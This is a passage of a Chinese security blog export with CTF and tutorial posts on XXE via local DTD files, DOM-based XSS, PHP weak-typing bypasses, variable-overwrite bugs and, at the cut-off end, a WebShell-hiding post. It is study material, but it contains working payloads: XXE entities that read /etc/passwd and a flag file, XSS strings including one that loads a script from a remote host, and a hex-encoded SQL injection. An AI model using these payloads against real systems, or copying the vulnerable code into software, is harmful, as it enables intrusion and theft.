condition &apos;aaa)&gt; &lt;!ENTITY &amp;#x25; file SYSTEM &quot;file:///etc/passwd&quot;&gt; &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///nonexistent/&amp;#x25;file;&amp;#x27;&gt;&quot;&gt; &amp;#x25;eval; &amp;#x25;error; &lt;!ELEMENT aa (bb&apos;&gt; %local_dtd;]&gt; sip-app_1_0.dtd 中的内容 1234…&lt;!ENTITY % condition &quot;and | or | not | equal | contains | exists | subdomain-of&quot;&gt;&lt;!ELEMENT pattern (%condition;)&gt;… 它起作用是因为所有XML实体都是常量，如果定义两个具有相同名称的实体则仅使用第一个实体。 内部DTD文件合集通过枚举来查找文件和目录应该是最简单的方法了，以下是一些成功应用此技巧的例子： Linux 123&lt;!ENTITY % local_dtd SYSTEM &quot;file:///usr/share/yelp/dtd/docbookx.dtd&quot;&gt;&lt;!ENTITY % ISOamsa &apos;Your DTD code&apos;&gt;%local_dtd; Windows 123&lt;!ENTITY % local_dtd SYSTEM &quot;file:///C:\\Windows\\System32\\wbem\\xml\\cim20.dtd&quot;&gt;&lt;!ENTITY % SuperClass &apos;&gt;Your DTD code&lt;!ENTITY test &quot;test&quot;&apos;&gt;%local_dtd; 感谢来自Positive Technologies的@Mike_n1分享的这条始终存在的Windows DTD文件路径。 Cisco WebEx 123&lt;!ENTITY % local_dtd SYSTEM &quot;file:///usr/share/xml/scrollkeeper/dtds/scrollkeeper-omf.dtd&quot;&gt;&lt;!ENTITY % url.attribute.set &apos;&gt;Your DTD code&lt;!ENTITY test &quot;test&quot;&apos;&gt;%local_dtd; Citrix XenMobile Server 123&lt;!ENTITY % local_dtd SYSTEM &quot;jar:file:///opt/sas/sw/tomcat/shared/lib/jsp-api.jar!/javax/servlet/jsp/resources/jspxml.dtd&quot;&gt;&lt;!ENTITY % Body &apos;&gt;Your DTD code&lt;!ENTITY test &quot;test&quot;&apos;&gt;%local_dtd; 多平台 IBM WebSphere 应用 1234567891011&lt;!ENTITY % local_dtd SYSTEM &quot;./../../properties/schemas/j2ee/XMLSchema.dtd&quot;&gt;&lt;!ENTITY % xs-datatypes &apos;Your DTD code&apos;&gt;&lt;!ENTITY % simpleType &quot;a&quot;&gt;&lt;!ENTITY % restriction &quot;b&quot;&gt;&lt;!ENTITY % boolean &quot;(c)&quot;&gt;&lt;!ENTITY % URIref &quot;CDATA&quot;&gt;&lt;!ENTITY % XPathExpr &quot;CDATA&quot;&gt;&lt;!ENTITY % QName &quot;NMTOKEN&quot;&gt;&lt;!ENTITY % NCName &quot;NMTOKEN&quot;&gt;&lt;!ENTITY % nonNegativeInteger &quot;NMTOKEN&quot;&gt;%local_dtd; 0x02 Google CTF 2019 bnv题目地址：http://bnv.web.ctfcompetition.com/ 访问页面，有个选项框让你选择，然后返回该地址的一些信息： 查看源码，发现有个post.js： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152function AjaxFormPost() &#123; var datasend; var message = document.getElementById('message').value; message = message.toLowerCase(); var blindvalues = [ '10', '120', '140', '1450', '150', '1240', '12450', '1250', '240', '2450', '130', '1230', '1340', '13450', '1350', '12340', '123450', '12350', '2340', '23450', '1360', '12360', '24560', '13460', '134560', '13560', ]; var blindmap = new Map(); var i; var message_new = ''; for (i = 0; i &lt; blindvalues.length; i++) &#123; blindmap[i + 97] = blindvalues[i]; &#125; for (i = 0; i &lt; message.length; i++) &#123; message_new += blindmap[(message[i].charCodeAt(0))]; &#125; datasend = JSON.stringify(&#123; 'message': message_new, &#125;); var url = '/api/search'; xhr = new XMLHttpRequest(); xhr.open('POST', url, true); xhr.setRequestHeader('Content-type', 'application/json'); xhr.onreadystatechange = function() &#123; if (xhr.readyState == 4 &amp;&amp; xhr.status == 200) &#123; console.log(xhr.getResponseHeader('Content-Type')); if (xhr.getResponseHeader('Content-Type') == \"application/json; charset=utf-8\") &#123; try &#123; var json = JSON.parse(xhr.responseText); document.getElementById('database-data').value = json['ValueSearch']; &#125; catch(e) &#123;; document.getElementById('database-data').value = e.message; &#125; &#125; else &#123; document.getElementById('database-data').value = xhr.responseText; &#125; &#125;&#125; xhr.send(datasend);&#125; 主要功能就是将输入的内容转换成ASCII码，然后再到blindvalues的数组（数组大小为26）中寻找并替换，在此之前blindvalues的下标加了97，也就是说，我们输入的json的参数内容只能限定在26个字母中，这样就没法往下利用，点不在这。 没啥其他提示，看下报文，都是Json格式： 根据参考文章提示，Content-Type为application/json并使用Json进行数据交互的Web站点，可以修改其Content-Type为application/xml，并尝试进行XXE注入。 先修改Content-Type为application/xml，发现响应包返回没有找到开启的标签符\\&lt;，也就是明确是是可以解析XML格式数据的： 修改Json格式数据为XML格式数据，提示找不到DTD： 下面直接用内部DTD文件实现回显利用，先发送WebSphere测试下： 报错，找不到该内部DTD文件，而目标系统是Linux，直接换Linux的payload就好： 1234567891011&lt;?xml version=&quot;1.0&quot; ?&gt;&lt;!DOCTYPE message [&lt;!ENTITY % local_dtd SYSTEM &quot;file:///usr/share/yelp/dtd/docbookx.dtd&quot;&gt;&lt;!ENTITY % ISOamsa &apos; &lt;!ENTITY &amp;#x25; file SYSTEM &quot;file:///flag&quot;&gt; &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///nonexistent/&amp;#x25;file;&amp;#x27;&gt;&quot;&gt; &amp;#x25;eval; &amp;#x25;error;&apos;&gt;%local_dtd;&lt;message&gt;any text&lt;/message&gt; 访问flag文件即可得到flag： 0x03 参考Exploiting XXE with local DTD files Playing with Content-Type – XXE on JSON Endpoints 使用本地DTD文件来利用XXE漏洞实现任意结果输出","tags":[{"name":"Web安全","slug":"Web安全","permalink":"https://www.mi1k7ea.com/tags/Web安全/"},{"name":"XML注入","slug":"XML注入","permalink":"https://www.mi1k7ea.com/tags/XML注入/"}]},{"title":"浅析DOM型XSS","date":"2019-06-25T13:56:15.000Z","path":"2019/06/25/浅析DOM型XSS/","text":"0x01 DOM简介DOM（Document Object Model）即文档对象模型，是HTML和XML文档的编程接口。 其中HTML DOM定义了所有HTML元素的对象和属性，以及访问它们的方法。换言之，HTML DOM是关于如何获取、修改、添加或删除HTML元素的标准。 DOM以树结构表达HTML文档。 下图为HTML DOM树形结构示例： 0x02 DOM型XSS为何DOM型XSSDOM型XSS是基于DOM文档对象模型的一种漏洞。严格地说，DOM型XSS其实算反射型XSS，区别在于DOM型XSS并不会和后台进行交互，是完完全全的Web前端安全问题，要做防御也只能在客户端上进行防御。 首先，客户端的脚本程序可以通过DOM动态地检查和修改页面内容，它并不与服务端进行交互而是从客户端获得DOM中的数据（如从URL中获取数据）并在本地执行；其次，浏览器用户可以操纵DOM中的一些对象如URL、location等；因此，当攻击者可以控制一些DOM对象、输入一些恶意JS代码，而客户端的脚本并没有对用户输入内容进行有效的过滤就传入一些执行危险操纵的函数如eval等或直接输出到页面时，就会导致DOM型XSS漏洞的存在。 如下面的HTML文件就存在DOM型XSS，其功能是当我们在URL栏输入参数name的值后，就会在当前页面显示输入如的name的值，其功能的实现全都在前端JS中进行、未与后台进行任何交互： 123456789101112&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt;DOM XSS&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;script&gt; var pos=document.URL.indexOf(\"name=\")+5; document.write(decodeURI(document.URL.substring(pos,document.URL.length)));&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 从代码层面看，漏洞形成原因很简单，document.URL获取用户输入，在代码中未经过任何过滤就传递给了document.write输出到当前页面中。 当我们正常输入name值时页面直接显示输入的内容，F12查看DOM文档可看到输入的内容确实是插入到当前DOM结构中： 也就是说DOM结构我们用户输入可控，当我们输入XSS payload时就会弹框，造成DOM型XSS： 挖掘思路从挖洞角度看，任何漏洞都是从外部输入加上危险的操作导致的，这里DOM型XSS也不例外。 DOM型XSS中，其外部输入是JS中存在获取外部输入内容的可利用的代码如URL栏内容的location.href，然后该外部输入内容在未经过有效过滤的情况下就传入危险的输出函数直接输出到页面中或传入eval等危险执行函数就会在页面上直接解析恶意JS代码，导致DOM型XSS的存在。 下面列下外部输入Sources和危险敏感操作Sinks（包括执行/输出页面），而对于DOM型XSS漏洞挖掘来说，可以简单归纳为在客户端加载的JS代码中，存在Sources+Sinks的情况即有可能存在DOM型XSS。 Sources document.URL document.URLUnencoded document.location（及其许多属性） document.referrer window.location（及其许多属性） location location.href location.search location.hash location.pathname Sinks直接执行脚本类 eval(…) window.execScript(…) window.setInterval(…) window.setTimeout(…) 写HTML页面类 document.write(…) document.writeln(…) element.innerHTML(…) 直接修改DOM类 document.forms[0].action=… (and various other collections) document.attachEvent(…) document.create…(…) document.execCommand(…) document.body. … (accessing the DOM through the body object) window.attachEvent(…) 替换文档URL类 document.location=… (and assigning to location’s href, host and hostname) document.location.hostname=… document.location.replace(…) document.location.assign(…) document.URL=… window.navigate(…) 打开/修改窗口类 document.open(…) window.open(…) window.location.href=… (and assigning to location’s href, host and hostname) 当然，除此之外，还有比较细节的特性这里就不列举了，可自行研究。 0x03 收集的一些例子下面将一些遇到的题目案例做个简单的归纳，小结下常见的几种DOM型XSS场景。 location.hash+evalhash 属性是一个可读可写的字符串，该字符串是 URL 的锚部分（从 # 号开始的部分）。当其作为可控参数传入eval()时则会存在DOM型XSS漏洞。 dom_xss.php，eval()执行location.hash提取出来的内容： 123456789101112&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset=\"utf-8\"&gt; &lt;title&gt;XSSdemo&lt;/title&gt;&lt;/head&gt;&lt;script&gt; eval(decodeURI(location.hash.substr(1)))&lt;/script&gt;&lt;body&gt;&lt;/body&gt;&lt;/html&gt; 根据location.hash属性，在URL栏输入如下内容尝试往页面写入恶意js代码： 1#document.write(&quot;&lt;script&gt;alert(&apos;hacked by mi1k7ea&apos;)&lt;/script&gt;&quot;) 在Chrome下会被拦截，因为Chrome自带的XSS过滤机制： 放到Firefox中是没问题的： 为了使Chrome下也生效，我们在自己的服务端放置一个恶意JS文件： 1alert(\"Hacked by Mi1k7ea :) \") 然后改下poc远程加载恶意JS即可在Chrome上执行： 1#document.write(&quot;&lt;script/src=http://a.com/7ea.js&gt;&lt;/script&gt;&quot;) location.search+innerHTMLinnerHTML 属性设置或返回表格行的开始和结束标签之间的 HTML。 注意：innerHTML中嵌入script标签是不会执行JS代码的，可以使用img等标签替代。 案例源自：https://brutelogic.com.br/tests/sinks.html 12345678910111213141516171819&lt;!DOCTYPE html&gt;&lt;body&gt;&lt;p id=\"p1\"&gt;Hello, guest!&lt;/p&gt;&lt;script&gt; var currentSearch = document.location.search; var searchParams = new URLSearchParams(currentSearch); /*** Document Sink ***/ var username = searchParams.get('name'); if (username !== null) &#123; document.getElementById('p1').innerHTML = 'Hello, ' + username + '!'; &#125;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 通过document.location.search获取当前 URL 的查询部分（问号 ? 之后的部分）；然后获取其中的name参数，若name参数不为空则通过innerHTML嵌入到页面中。 payload如下： 1?name=&lt;img%20src=x%20onerror=alert(/dom/)&gt; location.search+document.locationlocation指示了其所连接对象的url位置。Document和window对象中都有location属性，可以通过window.location和document.location访问。 案例源自：https://brutelogic.com.br/tests/sinks.html 12345678910111213141516171819&lt;!DOCTYPE html&gt;&lt;body&gt;&lt;p id=\"p1\"&gt;Hello, guest!&lt;/p&gt;&lt;script&gt; var currentSearch = document.location.search; var searchParams = new URLSearchParams(currentSearch); /*** Location Sink ***/ var redir = searchParams.get('redir'); if (redir !== null) &#123; document.location = redir; &#125;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 从URL栏获取redir参数，判断不为空则赋值给document.location。而document.location会是页面跳转到输入的新的URL位置即更换访问的URL路径。此时可通过js伪协议实现DOM型XSS攻击。 payload如下，直接通过javascript伪协议实现XSS注入： 1?redir=javascript:alert(/dom/) location.search+evaleval() 函数计算 JavaScript 字符串，并把它作为脚本代码来执行。 案例源自：https://brutelogic.com.br/tests/sinks.html 123456789101112131415161718192021222324&lt;!DOCTYPE html&gt;&lt;body&gt;&lt;p id=\"p1\"&gt;Hello, guest!&lt;/p&gt;&lt;script&gt; var currentSearch = document.location.search; var searchParams = new URLSearchParams(currentSearch); /*** Execution Sink ***/ var nasdaq = 'AAAA'; var dowjones = 'BBBB'; var sp500 = 'CCCC'; var market = []; var index = searchParams.get('index').toString(); eval('market.index=' + index); document.getElementById('p1').innerHTML = 'Current market index is ' + market.index + '.';&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 这里获取URL栏的index值，然后调用eval()将该值赋给market.index，最后通过innerHTML将market.index的值输出到页面中。 本段代码问题在于参数index是直接传入eval()中，并未经过任何过滤，因此可直接输入恶意JS语句造成DOM型XSS。payload如下： 1?index=alert(/7ea/) 0x04 参考DOM Based Cross Site Scripting DOM BASED CROSS SITE SCRIPTING CLIENT-SIDE ATTACKS ON BROWSERS 那些年我们一起学XSS","tags":[{"name":"Web安全","slug":"Web安全","permalink":"https://www.mi1k7ea.com/tags/Web安全/"},{"name":"XSS","slug":"XSS","permalink":"https://www.mi1k7ea.com/tags/XSS/"}]},{"title":"PHP弱类型及相关函数Bypass小结","date":"2019-06-21T14:33:14.000Z","path":"2019/06/21/PHP弱类型小结/","text":"0x01 弱类型以及==和===先看下强类型和弱类型的区别。 强类型指的是每个变量和对象都必须具有声明类型，是在编译的时候就确定类型的数据，在执行时类型不能更改，代表语言如Java、C等；而弱类型在执行的时候才会确定类型， 代表语言如PHP、Python等。 强类型较安全，而且效率高；弱类型相比而言不安全 。 ==和=== ===在进行比较的时候，会先判断两个变量的类型是否相等，再比较；==在进行比较的时候，会先将变量类型转化成相同，再比较。也就是说，相比之前，==并不会去比较两个变量的类型是否相等。 除此之外，还有!=和!==，原理和前面一样。 如果比较一个数字和字符串或者比较涉及到数字内容的字符串，则字符串会被转换成数值并且比较按照数值来进行： 1234567&lt;?phpvar_dump(\"admin\"==0); //truevar_dump(\"1admin\"==1); //truevar_dump(\"admin1\"==1); //falsevar_dump(\"admin1\"==0); //truevar_dump(\"0e123456\"==\"0e4456789\"); //true ?&gt; 观察上述代码，”admin”==0 比较的时候，会将admin强制转化成数值，由于admin是字符串，转化的结果是0，自然和0相等； “1admin”==1 比较的时候会将1admin强制转化成数值，结果为1，而”admin1”==1等于错误，也就是”admin1”被强制转化成了0，为什么呢？——当一个字符串被当作一个数值来取值，其结果和类型如下：如果该字符串没有包含’.’、’e’、’E’并且其数值值在整形的范围之内，则该字符串被当作int来取值，其他所有情况下都被作为float来取值，该字符串的开始部分决定了它的值，如果该字符串以合法的数值开始，则使用该数值，否则其值为0； “0e123456”==”0e456789”比较的时候，会将0e这类字符串识别为科学计数法的数字，0的无论多少次方都是零，所以相等； 0x02 strcmp()strcmp(str1, str2)函数用于比较两个字符串是否一致，若一致则返回0，若str1&gt;str2则返回&gt;0，若str1&lt;str2则返回&lt;0。 在PHP版本为5.3.3至5.5中（不包含5.5），当比较数组和字符串的时候，返回值也是0，即可以通过赋值其中一个参数为数组来Bypass： 123456789&lt;?php$a = \"2398ruuu31fj81k2rio8hg9302i9e1i2098t95yh\";$b = $_GET['b'];if (!strcmp($a, $b)) &#123; echo \"Bypass by strcmp()!\";&#125; else &#123; echo \"No...\";&#125;?&gt; 在本地测试的PHP版本是5.6，处理弹出警告信息说第二个参数应该给string型外，还是能够成功Bypass： 0x03 intval()intval(var)函数用于获取变量的整数值。在转换时，函数会从字符串起始处进行转换直到遇到一个非数字的字符，即使出现无法转换的字符串也不会报错而是返回0，从而可以导致如下情形的Bypass： 123456789&lt;?php$a = $_GET['a'];if (intval($a) === 666) &#123; $sql = \"Select a From Table Where Id=\".$a; echo $sql;&#125; else &#123; echo \"No...\";&#125;?&gt; 0x04 md5()和sha1()md5()和sha1()都用于计算字符串的散列值，但是两者都无法处理数组、不会抛出异常而是直接返回false。 如下情形，要求输入两个数使得一个参数的md5值和另一个参数的sha1值相等，当都输入数组时会导致NULL=NULL从而Bypass： 123456789&lt;?php$a = $_GET['a'];$b = $_GET['b'];if (md5($a) === sha1($b)) &#123; echo \"Bypass md5() and sha1()!\";&#125; else &#123; echo \"No...\";&#125;?&gt; 0x05 is_numeric()is_numeric()函数用于检测变量是否为数字或数字字符串。 但是函数的范围比较广泛，不仅仅是十进制的数字，其可被十六进制的值进行绕过，如下情形可造成二次注入： 12345678910111213&lt;?php$name = $_GET['name'];$con = mysql_connect(\"localhost\",\"root\",\"hehe123\");if (!$con)&#123; die('Could not connect: ' . mysql_error());&#125;mysql_select_db(\"test\", $con);if (is_numeric($name)) &#123; mysql_query(\"insert into users values (3,\" . $name . \",'test')\");&#125;?&gt; 1′ union select 1,2,3的十六进制为0x312720756e696f6e2073656c65637420312c322c33 访问：http://127.0.0.1/x.php?name=0x312720756e696f6e2073656c65637420312c322c33 123456789mysql&gt; select * from users;+----+-----------------------+----------+| id | username | password |+----+-----------------------+----------+| 3 | 1&apos; union select 1,2,3 | test |+----+-----------------------+----------+1 row in set (0.00 sec) 0x06 in_array()in_array()函数用来判断一个值是否在某一个数组列表里面。其缺陷在于存在自动类型转换，如下当输入数字1后再紧跟其他字符串能够Bypass检测数组的功能： 123456789&lt;?php$id = $_GET['id'];if (in_array($id, array(1,2,3,4,5,6,7,8,9,0))) &#123; $sql = \"Select a From users Where Id='\".$id.\"'\"; echo $sql;&#125; else &#123; echo \"No...\";&#125;?&gt; 0x07 ereg()和eregi()ereg()和eregi()函数都用于正则匹配，两者的区别在于是否区分大小写，使用指定的模式搜索一个字符串中指定的字符串，如果匹配成功则返回true，否则返回false。 该函数可被%00截断来Bypass： 123456789&lt;?php$passwd = $_GET['passwd'];if (@ereg(\"^[a-zA-Z0-9_]+$\", $passwd)) &#123; $sql = \"Select username From users Where password='\".$passwd.\"'\"; echo $sql;&#125; else &#123; echo \"No...\";&#125;?&gt; 0x08 __wakeup()__wakeup()作为反序列化中的一个魔法函数，自unserialize()从字节流中创建了一个对象后，程序会马上检测是否具有__wakeup()函数存在。若存在，__wakeup()函数会立即被调用。 使用__wakeup()函数的目的是重建在序列化中可能丢失的任何数据库连接以及处理其它重新初始化的任务。 在如下情形中，在序列化字符串中，前面的数字代表的是后面字符串中字符的个数，如果数字与字符个数不匹配的话，就会报错，因此将1改成2会产生报错，导致不会去执行__wakeup()函数，从而Bypass： 12345678910111213141516&lt;?phpclass Mi1k7ea&#123; public $text = \"h12r0h1f0jfj\"; public function __wakeup() &#123; exit(\"[!]Bad Request.\"); &#125;&#125;// echo serialize(new Mi1k7ea());// O:7:\"Mi1k7ea\":1:&#123;s:4:\"text\";s:12:\"h12r0h1f0jfj\";&#125;echo unserialize($_GET['flag']);echo \"Bypass __wakeup()!\";?&gt; 输入正常的序列化内容是会执行__wakeup()函数的： 输入不正常的序列化内容，将数字改为与字符个数不匹配则可以Bypass： 0x09 json_decode()json_decode()函数用于对json格式数据进行json解码操作，对于一个json类型的字符串，会解密成一个数组。 其存在一个0==”efeaf”的Bypass缺陷：= 1234567891011&lt;?php$key = \"JsonTest\";if (isset($_GET['data'])) &#123; $data = json_decode($_GET['data']); if ($data-&gt;key == $key) &#123; echo \"Bypass json_decode()!\"; &#125; else &#123; echo \"No...\"; &#125;&#125;?&gt; 0x10 md5()哈希碰撞md5()哈希碰撞是基于弱类型==或!=的。 下面看个题目，大意是要输入一个字符串和数字类型，并且他们的md5值相等，就可以成功执行下一步语句 ： 12345678910111213141516&lt;?phpif (isset($_GET['username']) &amp;&amp; isset($_GET['password'])) &#123; $logined = true; $username = $_GET['username']; $password = $_GET['password']; if (!ctype_alpha($username)) &#123;$logined = false;&#125; if (!is_numeric($password) ) &#123;$logined = false;&#125; if (md5($username) != md5($password)) &#123;$logined = false;&#125; if ($logined)&#123; echo \"successful\"; &#125;else&#123; echo \"login failed!\"; &#125;&#125;?&gt; 前面提到过，0e在比较的时候会将其视作为科学计数法，所以无论0e后面是什么，0的多少次方还是0。md5(‘240610708’) == md5(‘QNKCDZO’)成功绕过： 介绍一批md5开头是0e的字符串 ： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107QNKCDZO0e830400451993494058024219903391 s878926199a0e545993274517709034328855841020 s155964671a0e342768416822451524974117254469 s214587387a0e848240448830537924465865611904 s214587387a0e848240448830537924465865611904 s878926199a0e545993274517709034328855841020 s1091221200a0e940624217856561557816327384675 s1885207154a0e509367213418206700842008763514 s1502113478a0e861580163291561247404381396064 s1885207154a0e509367213418206700842008763514 s1836677006a0e481036490867661113260034900752 s155964671a0e342768416822451524974117254469 s1184209335a0e072485820392773389523109082030 s1665632922a0e731198061491163073197128363787 s1502113478a0e861580163291561247404381396064 s1836677006a0e481036490867661113260034900752 s1091221200a0e940624217856561557816327384675 s155964671a0e342768416822451524974117254469 s1502113478a0e861580163291561247404381396064 s155964671a0e342768416822451524974117254469 s1665632922a0e731198061491163073197128363787 s155964671a0e342768416822451524974117254469 s1091221200a0e940624217856561557816327384675 s1836677006a0e481036490867661113260034900752 s1885207154a0e509367213418206700842008763514 s532378020a0e220463095855511507588041205815 s878926199a0e545993274517709034328855841020 s1091221200a0e940624217856561557816327384675 s214587387a0e848240448830537924465865611904 s1502113478a0e861580163291561247404381396064 s1091221200a0e940624217856561557816327384675 s1665632922a0e731198061491163073197128363787 s1885207154a0e509367213418206700842008763514 s1836677006a0e481036490867661113260034900752 s1665632922a0e731198061491163073197128363787 s878926199a0e545993274517709034328855841020","tags":[{"name":"Web安全","slug":"Web安全","permalink":"https://www.mi1k7ea.com/tags/Web安全/"},{"name":"PHP","slug":"PHP","permalink":"https://www.mi1k7ea.com/tags/PHP/"}]},{"title":"PHP变量覆盖漏洞小结","date":"2019-06-20T13:34:18.000Z","path":"2019/06/20/PHP变量覆盖漏洞/","text":"0x01 概述变量覆盖即通过外部输入将某个变量的值给覆盖掉。 通常将可以用自定义的参数值替换原有变量值的情况称为变量覆盖漏洞。 0x02 register_globals全局变量覆盖php.ini中有一项为register_globals，即注册全局变量，当register_globals=On时，传递过来的值会被直接的注册为全局变量直接使用，而register_globals=Off时，我们需要到特定的数组里去得到它。 注意：register_globals已自 PHP 5.3.0 起废弃并将自 PHP 5.4.0 起移除。 当register_globals=On，变量未被初始化且能够用户所控制时，就会存在变量覆盖漏洞： 1234567&lt;?phpecho \"Register_globals: \" . (int)ini_get(\"register_globals\") . \"&lt;br/&gt;\";if ($a) &#123; echo \"Hacked!\";&#125;?&gt; 通过GET和POST方式输入变量a的值： 当然，也可以从COOKIE中输入： 0x03 extract()变量覆盖extract()函数从数组中将变量导入到当前的符号表。该函数使用数组键名作为变量名，使用数组键值作为变量值。针对数组中的每个元素，将在当前符号表中创建对应的一个变量。 函数定义如下： 1int extract ( array $var_array [, int $extract_type [, string $prefix ]] ) 其中，第二个参数指定函数将变量导入符号表时的行为，最常见的两个值是EXTR_OVERWRITE和EXTR_SKIP。 当值为EXTR_OVERWRITE时，在将变量导入符号表的过程中，如果变量名发生冲突，则覆盖所有变量；值为EXTR_SKIP则表示跳过不覆盖。若第二个参数未指定，则在默认情况下使用EXTR_OVERWRITE。 当extract()函数从用户可以控制的数组中导出变量且第二个参数未设置或设置为EXTR_OVERWRITE时，就存在变量覆盖漏洞： 123456789&lt;?php$a = \"0\";extract($_GET);if ($a == 1) &#123; echo \"Hacked!\";&#125; else &#123; echo \"Hello!\";&#125;?&gt; 以上示例是以GET为例： 防御方法：在调用extract()时使用EXTR_SKIP保证已有变量不会被覆盖 1extract($_GET,EXTR_SKIP); 0x04 parse_str()变量覆盖parse_str()函数通常用于解析URL中的querystring，把查询字符串解析到变量中，如果没有array参数，则由该函数设置的变量将覆盖已存在的同名变量。 函数定义如下： 1void parse_str ( string $str [, array &amp;$arr ]) 当parse_str()函数的参数值可以被用户控制时，则存在变量覆盖漏洞： 12345678910&lt;?php$a = 'oop';parse_str($_SERVER[\"QUERY_STRING\"]);if ($a == 'mi1k7ea') &#123; echo \"Hacked!\";&#125; else &#123; echo \"Hello!\";&#125;?&gt; 再来看到小题目： 1234567891011121314151617&lt;?phperror_reporting(0);if(empty($_GET['id'])) &#123; show_source(__FILE__); die();&#125; else &#123; include ('flag.php'); $a = \"www.mi1k7ea.com\"; $id = $_GET['id']; @parse_str($id); if ($a[0] != 'QNKCDZO' &amp;&amp; md5($a[0]) == md5('QNKCDZO')) &#123; echo $flag; &#125; else &#123; exit('so easy!'); &#125;&#125;?&gt; 是弱类型和变量覆盖的结合： 0x05 mb_parse_str()变量覆盖mb_parse_str()函数用于解析GET/POST/COOKIE数据并设置全局变量，和parse_str()类似： 12345678910&lt;?php$a = 'oop';mb_parse_str($_SERVER[\"QUERY_STRING\"]);if ($a == 'mi1k7ea') &#123; echo \"Hacked!\";&#125; else &#123; echo \"Hello!\";&#125;?&gt; 0x06 import_request_variables()变量覆盖支持版本：PHP 4 &gt;= 4.1.0, PHP 5 &lt; 5.4.0 import_request_variables()函数将GET、POST、Cookies中的变量导入到全局。 函数定义如下： 1bool import_request_variables (string $types [, string $prefix]) $type代表要注册的变量，G代表GET，P代表POST，C代表COOKIE，第二个参数为要注册变量的前缀。 使用这个函数只用简单地指定类型即可，这里G指定导入GET请求中的变量： 12345678910&lt;?php$a = \"0\";import_request_variables(\"G\");if ($a == 1) &#123; echo \"Fucked!\";&#125; else &#123; echo \"Nothing!\";&#125;?&gt; 0x07 $$导致的变量覆盖$$即可变变量，一个可变变量获取了一个普通变量的值作为这个可变变量的变量名。 \\$与\\$​\\$的区别 \\$var是一个正常变量，名称为：var，存储任何值，如：string，integer，float等。 \\$\\$var是一个引用变量，用于存储\\$var的值。 看个Demo就清楚了： 1234567891011&lt;?php $x = \"mi1k7ea\"; $$x = 666; echo $x.\"&lt;br/&gt;\"; echo $$x.\"&lt;br/&gt;\"; echo $mi1k7ea; //也可以写到双引号中解析，输出结果一样 // echo \"$x&lt;br/&gt;\"; // echo \"$&#123;$x&#125;&lt;br/&gt;\"; // echo \"$mi1k7ea\";?&gt; 变量覆盖漏洞 $$导致的变量覆盖问题在CTF代码审计题目中经常在foreach中出现，如以下的示例代码，使用foreach来遍历数组中的值，然后再将获取到的数组键名作为变量，数组中的键值作为变量的值。因此就产生了变量覆盖漏洞。： 123456789101112131415&lt;?phpforeach (array('_COOKIE','_POST','_GET') as $_request) &#123; foreach ($$_request as $_key=&gt;$_value) &#123; $$_key= $_value; &#125;&#125;$id = isset($id) ? $id : \"test\";if($id === \"mi1k7ea\") &#123; echo \"flag&#123;xxxxxxxxxx&#125;\";&#125; else &#123; echo \"Nothing...\";&#125;?&gt; 这里以GET、POST或COOKIE都能触发，传入id=mi1k7ea后，在foreach语句中，\\$_key为id，\\$_value为mi1k7ea，进而\\$\\$_key为$id，从而实现了变量覆盖： 一道CTF题目 1234567891011121314151617181920212223&lt;?phpinclude \"flag.php\";$_403 = \"Access Denied\";$_200 = \"Welcome Admin\";if ($_SERVER[\"REQUEST_METHOD\"] != \"POST\")&#123; die(\"BugsBunnyCTF is here :p…\");&#125;if ( !isset($_POST[\"flag\"]) )&#123; die($_403);&#125;foreach ($_GET as $key =&gt; $value)&#123; $$key = $$value;&#125;foreach ($_POST as $key =&gt; $value)&#123; $$key = $value;&#125;if ( $_POST[\"flag\"] !== $flag ) &#123; die($_403);&#125; else &#123; echo \"This is your flag : \". $flag . \"\\n\"; die($_200);&#125;?&gt; 可以看到，有3个if语句和2个foreach语句。 在if语句中，第一个需要你是通过POST方式进行请求，第二个是需要POST一个flag参数过去，第三个是比较flag参数和包含进来的真正的flag是否相等。 在foreach语句中，第一个是可以将GET的参数进行变量覆盖，第二个是将POST的参数进行变量覆盖，但两个语句的处理是有点区别的即一个键值为\\$\\$value另一个为\\$value。 这里整理一下思路：因为POST的参数必须为flag，则第二个foreach语句的\\$key为flag，进而\\$\\$key为\\$flag，从而得到\\$flag的值为POST传递的flag参数的值；这里因为第二个foreach语句修改了\\$flag原来的值为POST传递的flag参数的值，因而最后一个if语句的条件是恒不成立的，在其后的else代码块逻辑中echo输出出来的只能是修改了的\\$flag的值即POST传递的flag参数的值而非原本的\\$flag的值、接着输出\\$_200变量的值；要想输出原本的\\$flag的值，我们需要将原本的\\$flag覆盖\\$_200变量，因此在第一个foreach语句中通过GET输入_200=flag，从而得到的\\$\\$key为\\$_200、\\$\\$value为\\$flag，从而实现在修改\\$flag的值之前将其覆盖到\\$_200变量中。 验证一下： 0x08 参考CTF之php变量覆盖漏洞","tags":[{"name":"Web安全","slug":"Web安全","permalink":"https://www.mi1k7ea.com/tags/Web安全/"},{"name":"PHP","slug":"PHP","permalink":"https://www.mi1k7ea.com/tags/PHP/"}]},{"title":"巧用get_defined_functions隐藏WebShell","date":"2019-06-09T10:14:48.000Z","path":"2019/06/09/巧用get-defined-functions隐藏WebShell/","text":"0x01 get_defined_functions支持的PHP版本：PHP 4&gt; = 4.0.4，PHP 5，PHP 7 get_defined_functions：返回一个包含所有已定义函数的数组。 函数定义如下： 1get_defined_functions ([ bool $exclude_disabled = FALSE ] ) : array Demo 1234&lt;?php$arr = get_defined_functions();print_r($arr);?&gt; 访问会输出以下内容： 123456789101112131415161718192021222324Array( [internal] =&gt; Array ( [0] =&gt; zend_version [1] =&gt; func_num_args [2] =&gt; func_get_arg [3] =&gt; func_get_args ... [459] =&gt; exec [460] =&gt; system [461] =&gt; escapeshellcmd [462] =&gt; escapeshellarg [463] =&gt; passthru [464] =&gt; shell_exec ... [1910] =&gt; xdebug_get_headers ) [user] =&gt; Array ( )) 